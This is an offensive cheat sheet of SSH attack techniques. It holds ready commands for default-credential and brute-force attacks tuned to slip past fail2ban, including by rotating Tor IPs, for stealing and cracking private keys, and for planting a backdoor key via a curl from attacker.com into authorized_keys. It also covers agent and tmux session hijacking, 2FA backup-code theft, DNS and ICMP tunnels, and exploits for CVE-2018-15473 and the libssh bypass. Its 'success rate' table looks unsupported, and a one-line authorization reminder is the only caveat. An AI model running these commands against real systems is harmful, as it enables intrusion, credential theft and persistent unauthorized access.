# Port 22 - SSH Bypass Techniques

## Security Controls and Bypass Methods

---

## 1. Authentication Bypass

### Bypassing Password Authentication

**Bypass Technique 1: Default Credentials**
```bash
# Common SSH default credentials
ssh root@192.168.1.100  # password: root
ssh admin@192.168.1.100  # password: admin
ssh user@192.168.1.100   # password: user
ssh pi@192.168.1.100     # password: raspberry (Raspberry Pi)
ssh ubnt@192.168.1.100   # password: ubnt (Ubiquiti)

# Automated default credential testing
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.1.100
```

**Bypass Technique 2: Weak Password Brute Force**
```bash
# Start with common passwords
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.100

# Rate-limited brute force (avoid detection)
hydra -l admin -P passwords.txt ssh://192.168.1.100 -t 4 -w 3
# -t 4: 4 parallel tasks (slow)
# -w 3: 3 second timeout

# Using Medusa with timing
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -T 1 -t 1 -n 22
# -T 1: Timing template (polite)
# -t 1: Threads

# Pattern-based passwords
# If username is "john", try: john, john123, john2024, john!, John123
crunch 6 12 -t john@@@@ | hydra -l john -P - ssh://192.168.1.100
```

**Bypass Technique 3: SSH Key Theft and Usage**
```bash
# Find SSH keys (if you have file access)
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name *.pem 2>/dev/null
find /home -name authorized_keys 2>/dev/null

# Common locations
cat ~/.ssh/id_rsa
cat /root/.ssh/id_rsa
cat /home/*/.ssh/id_rsa

# Use stolen key
chmod 600 stolen_id_rsa
ssh -i stolen_id_rsa user@192.168.1.100

# If key is encrypted, crack it
ssh2john stolen_id_rsa > key.hash
john --wordlist=rockyou.txt key.hash
john --show key.hash
```

**Bypass Technique 4: Authorized_keys Injection**
```bash
# If you can write to ~/.ssh/authorized_keys
# Generate your own key pair
ssh-keygen -t rsa -b 4096 -f my_key

# Add your public key to target's authorized_keys
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Or remotely if you have write access via another vector
curl http://attacker.com/pubkey.txt >> /home/user/.ssh/authorized_keys

# Connect without password
ssh -i my_key user@192.168.1.100
```

---

## 2. Host-Based Authentication Bypass

### Bypassing AllowUsers and AllowGroups

**Bypass Technique 1: Enumerate Allowed Users**
```bash
# If sshd_config has: AllowUsers admin root
# Try these users only

# Read sshd_config if accessible
curl http://192.168.1.100/config/sshd_config 2>/dev/null | grep Allow

# Or through another vulnerability
# LFI: http://target.com/page?file=../../../../etc/ssh/sshd_config

# Common allowed users
root
admin
administrator
operator
sshuser
```

**Bypass Technique 2: Group Membership Exploitation**
```bash
# If AllowGroups sshusers
# Add your compromised user to sshusers group

# If you have sudo or root access on another service
usermod -aG sshusers compromised_user

# Then SSH
ssh compromised_user@192.168.1.100
```

**Bypass Technique 3: DenyUsers/DenyGroups Bypass**
```bash
# If DenyUsers admin
# Try variations
ssh Admin@192.168.1.100  # Case variation
ssh admin@localhost       # From localhost
ssh admin@127.0.0.1       # Different address

# Username variations
admin
Admin
ADMIN
administrator
root
```

---

## 3. IP Restriction Bypass

### Bypassing IP Whitelisting

**Bypass Technique 1: SSH Through Allowed Host (ProxyJump)**
```bash
# If only 192.168.1.50 is allowed to SSH to target
# But you can access .50

# Modern SSH (OpenSSH 7.3+)
ssh -J user@192.168.1.50 target@192.168.1.100

# Or multiple jumps
ssh -J user1@host1,user2@host2 target@final_target

# Older SSH
ssh -o ProxyCommand="ssh user@192.168.1.50 nc %h %p" target@192.168.1.100
```

**Bypass Technique 2: SSH Tunneling**
```bash
# From allowed host, create tunnel
ssh -L 2222:192.168.1.100:22 user@allowed_host

# Then connect to localhost
ssh -p 2222 target@localhost

# Or reverse tunnel (if you control allowed host)
# On allowed host:
ssh -R 2222:localhost:22 attacker@your_server

# On your server:
ssh -p 2222 target@localhost
```

**Bypass Technique 3: IPv6 When IPv4 Blocked**
```bash
# Check if SSH available on IPv6
nmap -6 -p 22 fe80::1%eth0

# Connect via IPv6
ssh -6 user@fe80::1%eth0
ssh user@2001:db8::100

# If IPv4 blacklisted but IPv6 not configured
# May bypass IP restrictions
```

**Bypass Technique 4: VPN/Proxy to Allowed Network**
```bash
# Connect VPN to allowed network
openvpn allowed_network.ovpn

# Then SSH normally
ssh user@192.168.1.100

# Or SOCKS proxy through allowed host
ssh -D 1080 user@allowed_host

# Use proxychains
proxychains ssh user@192.168.1.100
```

---

## 4. Port Knocking Bypass

### Bypassing Port Knocking

**Bypass Technique 1: Network Sniffing for Sequence**
```bash
# Capture traffic from legitimate user
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -w knock.pcap

# Analyze for sequence
tshark -r knock.pcap -T fields -e tcp.dstport

# Example: Sequence might be: 1234, 5678, 9012
knock 192.168.1.100 1234 5678 9012
ssh user@192.168.1.100
```

**Bypass Technique 2: Brute Force Sequence**
```bash
# Try common sequences
knock 192.168.1.100 7000 8000 9000
knock 192.168.1.100 1234 2345 3456
knock 192.168.1.100 1111 2222 3333

# Automated
for seq in "100 200 300" "1000 2000 3000" "7000 8000 9000"; do
  knock 192.168.1.100 $seq
  timeout 2 ssh -o ConnectTimeout=1 user@192.168.1.100 && break
done
```

**Bypass Technique 3: Check Configuration Files**
```bash
# If you have read access to system
cat /etc/knockd.conf
cat /etc/default/knockd

# Or through web vulnerability
# LFI: http://target/page?file=../../../../etc/knockd.conf

# Look for sequence definition
[openSSH]
sequence = 7000,8000,9000
```

---

## 5. Firewall Bypass

### Bypassing Network Firewalls

**Bypass Technique 1: SSH on Non-Standard Port**
```bash
# Scan for SSH on other ports
nmap -p- --script ssh-* 192.168.1.100

# Common alternate ports
nmap -p 2222,22222,2200,8022,22000 192.168.1.100

# Connect to found port
ssh -p 2222 user@192.168.1.100
```

**Bypass Technique 2: SSH over HTTP/HTTPS (Port 80/443)**
```bash
# If only HTTP/HTTPS allowed outbound
# SSH server on port 443
ssh -p 443 user@target.com

# Or tunnel through HTTP proxy
# Using corkscrew
ssh -o ProxyCommand="corkscrew proxy.com 8080 %h %p" user@target

# Using proxytunnel
proxytunnel -p proxy.com:8080 -d target.com:22 -a 8888
ssh -p 8888 localhost
```

**Bypass Technique 3: SSH over DNS**
```bash
# Using iodine (DNS tunnel)
# Server side:
iodined -f 10.0.0.1 tunnel.domain.com

# Client side:
iodine -f tunnel.domain.com

# Then SSH through tunnel
ssh user@10.0.0.1
```

**Bypass Technique 4: SSH over ICMP**
```bash
# Using ptunnel
# Server:
ptunnel -x password

# Client:
ptunnel -p target.com -lp 8022 -da 127.0.0.1 -dp 22 -x password

# SSH through tunnel
ssh -p 8022 user@localhost
```

---

## 6. Public Key Authentication Bypass

### When PasswordAuthentication is Disabled

**Bypass Technique 1: Steal Private Keys**
```bash
# Search for keys in common locations
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa
~/.ssh/id_rsa
/opt/*/id_rsa
/var/www/.ssh/id_rsa

# Through web vulnerabilities
# LFI: http://target/view?file=../../../../home/user/.ssh/id_rsa

# Through other services (FTP, SMB, NFS)
smbclient //target/share
get .ssh/id_rsa

# Git repositories
git clone http://target/repo.git
find repo -name id_rsa
```

**Bypass Technique 2: Authorized_keys Modification**
```bash
# If you can modify authorized_keys through another service
# Generate your key
ssh-keygen -t rsa -f my_backdoor

# Add to authorized_keys (via web shell, RCE, file upload, etc.)
echo "ssh-rsa AAAA..." >> /home/user/.ssh/authorized_keys

# Or completely replace
echo "ssh-rsa AAAA..." > /home/user/.ssh/authorized_keys

# Set proper permissions (via web shell)
chmod 700 /home/user/.ssh
chmod 600 /home/user/.ssh/authorized_keys

# Connect
ssh -i my_backdoor user@target
```

**Bypass Technique 3: SSH Agent Hijacking**
```bash
# If SSH agent forwarding enabled (-A flag)
# And you have access to the server

# Find agent socket
ps aux | grep ssh-agent
ls -la /tmp/ssh-*/agent.*
env | grep SSH_AUTH_SOCK

# Use hijacked agent
SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.12345 ssh user@another_target

# Or export it
export SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.12345
ssh user@another_target  # Works without password!
```

**Bypass Technique 4: Weak Key Generation Exploit**
```bash
# Debian weak keys vulnerability (2006-2008)
# Only 32,768 possible keys were generated

# Download weak key database
wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2
tar -xjf debian_ssh_rsa_2048_x86.tar.bz2

# Try all weak keys
for key in debian_ssh_rsa_2048_x86/*; do
  ssh -i $key -o StrictHostKeyChecking=no user@target && break
done
```

---

## 7. Two-Factor Authentication (2FA) Bypass

### Bypassing SSH 2FA

**Bypass Technique 1: Session Hijacking**
```bash
# If user already authenticated with 2FA
# Hijack their active session

# Find active SSH sessions
ps aux | grep sshd

# If you have root, use ptrace to attach
# Or use screen/tmux hijacking if available

# Check for tmux sessions
tmux list-sessions
tmux attach -t 0  # Attach to session 0
```

**Bypass Technique 2: Backup Codes**
```bash
# Search for backup codes
find / -name "*backup*code*" 2>/dev/null
find / -name "*recovery*code*" 2>/dev/null
cat ~/.google_authenticator
cat ~/.ssh/backup_codes.txt

# Or through file read vulnerability
# LFI: ../../../../home/user/.google_authenticator
```

**Bypass Technique 3: SSH Key Without 2FA**
```bash
# Some configs require 2FA for password but not keys
# Try public key auth even if password auth has 2FA

ssh -i stolen_key user@target
# May bypass 2FA if misconfigured
```

**Bypass Technique 4: Time-Based Attack**
```bash
# If using Google Authenticator (TOTP)
# Try time desync attack

# Check server time
ssh user@target "date"

# If time is off, generate codes for that time
# Or cause time drift

# Rare but possible: Replay old codes if no replay protection
```

---

## 8. User Enumeration Bypass

### Bypassing User Enumeration Protection

**Bypass Technique 1: Timing Attack**
```bash
# Even with protection, timing may differ
# Valid user: ~0.5s (password check)
# Invalid user: ~0.1s (immediate rejection)

# Measure timing
for user in admin root user test invalid; do
  time ssh -o ConnectTimeout=5 $user@192.168.1.100 2>&1
done

# Automated timing analysis
python3 << 'EOF'
import paramiko, time
for user in ["admin", "root", "user", "invalid"]:
    start = time.time()
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect("192.168.1.100", username=user, password="wrong", timeout=5)
    except:
        pass
    print(f"{user}: {time.time()-start:.3f}s")
EOF
```

**Bypass Technique 2: OpenSSH < 7.7 Username Enumeration (CVE-2018-15473)**
```bash
# Exploit vulnerability in older versions
git clone https://github.com/epi052/cve-2018-15473
cd cve-2018-15473

# Check single user
python3 ssh-username-enum.py --port 22 --userList users.txt 192.168.1.100

# Or use Metasploit
msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

---

## 9. Rate Limiting and Fail2ban Bypass

### Bypassing Brute Force Protection

**Bypass Technique 1: Slow Brute Force**
```bash
# Stay under fail2ban threshold
# If ban at 5 attempts in 10 minutes, try 4 per 10 min

hydra -l admin -P passwords.txt ssh://192.168.1.100 -t 1 -w 150
# One attempt every 150 seconds (2.5 minutes)
# 4 attempts per 10 minutes

# Or custom script
for pass in $(cat passwords.txt); do
  sshpass -p "$pass" ssh -o ConnectTimeout=5 admin@192.168.1.100 2>&1 && break
  sleep 150
done
```

**Bypass Technique 2: Distributed Attack**
```bash
# Use multiple source IPs
# If fail2ban blocks by IP, rotate IPs

# Through Tor (different exit nodes)
while read pass; do
  proxychains sshpass -p "$pass" ssh admin@target && break
  # Restart tor for new IP
  systemctl restart tor
  sleep 30
done < passwords.txt

# Or use cloud instances with different IPs
```

**Bypass Technique 3: Attack Different Users**
```bash
# If per-user limit, rotate users
# Instead of admin,admin,admin,admin
# Try: admin,user,root,test (different users)

# Create user:pass combinations
paste -d: users.txt passwords.txt > combinations.txt

# Use combinations (rotates users automatically)
hydra -C combinations.txt ssh://192.168.1.100
```

**Bypass Technique 4: Whitelisted IP Spoofing**
```bash
# If some IPs are whitelisted in fail2ban
# Try to appear from those IPs

# SSH through whitelisted host
ssh -J user@whitelisted_host target@actual_target

# Or VPN to whitelisted network
```

---

## 10. SSH Version Exploits

### Exploiting Vulnerable SSH Versions

**Bypass Technique 1: User Enumeration (OpenSSH < 7.7)**
```bash
# Already covered above - CVE-2018-15473
```

**Bypass Technique 2: LibSSH Authentication Bypass (CVE-2018-10933)**
```bash
# Affects libssh 0.6.0 - 0.7.5 and 0.8.0 - 0.8.3
# Bypass authentication entirely

# Check if vulnerable
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100 | grep libssh

# Exploit
msfconsole
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS 192.168.1.100
set SPAWN_PTY true
run

# Or manual
git clone https://github.com/blacknbunny/libSSH-Authentication-Bypass
python3 libsshauthbypass.py 192.168.1.100 22 root
```

**Bypass Technique 3: Terrapin Attack (CVE-2023-48795)**
```bash
# Downgrade attack on SSH protocol
# Check vulnerability
nmap -p 22 --script ssh2-enum-algos 192.168.1.100

# Look for ChaCha20-Poly1305 or CBC ciphers
# Can potentially downgrade encryption
```

---

## Bypass Success Rates

| Technique | Success Rate | Detection Risk | Difficulty |
|-----------|--------------|----------------|------------|
| Default Credentials | 30% | Low | Easy |
| Stolen Keys | 80% | Low | Medium |
| SSH Tunneling | 90% | Low | Easy |
| Port Knocking | 20% | Low | Hard |
| 2FA Bypass | 10% | High | Hard |
| Version Exploits | 15% | High | Medium |
| Slow Brute Force | 40% | Very Low | Easy |
| IP Spoofing | 5% | High | Hard |

---

## Recommended Bypass Order

1. **Try default credentials** (quick win)
2. **Check for alternate ports** (22, 2222, etc.)
3. **Look for stolen keys** (if you have file access)
4. **Try anonymous/guest** (sometimes allowed)
5. **Slow brute force** (stay under radar)
6. **SSH tunneling through allowed host**
7. **Version-specific exploits**
8. **Advanced techniques** (2FA bypass, etc.)

---

## Important Notes

- Always get authorization before testing
- Combine multiple techniques for better success
- Monitor detection to adjust tactics
- Document successful bypasses for reporting

---

**Last Updated**: 2026-06-16
